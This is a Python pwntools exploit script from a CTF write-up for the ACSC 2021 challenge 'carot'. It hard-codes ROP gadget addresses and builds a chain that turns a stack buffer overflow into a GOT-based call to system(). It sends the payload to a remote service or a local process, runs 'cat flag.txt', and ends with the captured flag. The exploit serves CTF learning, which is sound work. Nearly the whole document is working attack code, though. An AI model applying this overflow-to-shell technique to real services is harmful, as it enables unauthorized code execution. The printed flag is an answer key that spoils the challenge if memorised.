# From https://stdnoerr.github.io/ctf/2021/09/19/ACSC2021.html by stdnoerr

#!/usr/bin/env python3

from pwn import *

def start():
    global p
    if args.REMOTE:
        p = remote('35.189.142.38', 11451)
    else:
        p = elf.process(env = {"LD_PRELOAD": libc.path})

context.binary = elf = ELF('./carot')
libc = ELF('./libc-2.31.so')

pop_rbp                = 0x400828
pop_rdi                = 0x4010d3
pop_rbx_pop_rbp_pop_4  = 0x4010ca
pop_rsi_pop_r15        = 0x4010d1

ret                    = pop_rdi + 1

mov_rax_qword_rbp_8    = 0x400b7d
mov_qword_rbp_0x30_rax = 0x400cae

add_dword_rbp_0x3d_ebx = 0x400888

jmp_qword_rbp          = 0x4014fb

junk = u64(b'JUNKJUNK')

ropchain = [
    pop_rbp, elf.got.printf + 8,
    mov_rax_qword_rbp_8,
    junk, junk, junk,

    pop_rbx_pop_rbp_pop_4, (libc.sym.system - libc.sym.printf) & 0xffffffff, elf.sym.gif - 8 + 0x30,
    junk, junk, junk, junk,

    mov_qword_rbp_0x30_rax,
    junk, junk, junk, junk, junk, junk, elf.sym.gif - 8 + 0x3d, # rbp

    add_dword_rbp_0x3d_ebx,

    pop_rdi, 0x4012f0,
    pop_rsi_pop_r15, elf.sym.gif,
    junk,

    elf.plt.__isoc99_scanf,

    pop_rdi, elf.sym.gif,
    pop_rbp, elf.sym.gif - 8,
    ret,
    jmp_qword_rbp
]

payload = b''.join([p64(x) for x in ropchain])

start()

p.sendline(b'A'*536 + payload)
p.sendline('cat flag.txt')
p.sendline()

p.interactive()
p.close()

# python3 exp2.py REMOTE
# ACSC{buriburi_1d3dfb9bf7654412}